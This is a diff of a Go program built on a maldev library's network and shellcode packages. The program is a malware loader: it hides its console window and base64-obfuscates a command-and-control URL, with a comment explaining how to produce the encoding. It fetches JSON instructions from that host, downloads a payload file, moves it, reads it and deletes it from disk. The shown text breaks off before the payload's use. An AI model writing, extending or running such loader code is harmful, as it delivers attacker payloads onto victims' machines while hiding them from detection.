@@ -3,12 +3,14 @@ package main
 import (
 	"encoding/base64"
 	"encoding/json"
+	"strings"
+	"syscall"
+
 	"fmt"
 	"io"
 	"log"
 	"net/http"
 	"os"
-	"syscall"
 
 	"github.com/D3Ext/maldev/network"
 	"github.com/D3Ext/maldev/shellcode"
@@ -25,10 +27,13 @@ type Config struct {
 }
 
 func main() {
-	//HConsole()
+	HConsole()
 	var config Config
-	url := "http://192.168.0.106/instr"
-	//fmt.Println("Hello Worlds")
+	//url := "http://192.168.5.132/instr" //URL non decoded
+	url := "aHR0cDovLzE5Mi4xNjguNS4xMzIvaW5zdHIK" //Base64 address of the json instructions. Use the linux base64 command on a text file containing the address and drop the result here.
+	urlBytes, _ := base64.RawStdEncoding.DecodeString(url)
+	url = string(urlBytes)
+	url = strings.Split(url, "\n")[0]
 	response, err := http.Get(url)
 	if err != nil {
 		log.Fatal(err)
@@ -45,11 +50,11 @@ func main() {
 		fmt.Println(err)
 		os.Exit(1)
 	}
-	//fmt.Println(config)
-	//fmt.Println("[+]Getting Files From:" + config.DlURL + "/" + config.FileName)
+	fmt.Println(config)
+	fmt.Println("[+]Getting Files From:" + config.DlURL + "/" + config.FileName)
 	network.DownloadFile(config.DlURL + "/" + config.FileName)
 	os.Rename(config.FileName, config.PathNew)
-	//fmt.Println("[+]Moving to: " + config.PathNew)
+	fmt.Println("[+]Moving to: " + config.PathNew)
 	contents, _ := os.ReadFile(config.PathNew)
 	os.Remove(config.PathNew)
 	//contentsStr := string(contents)
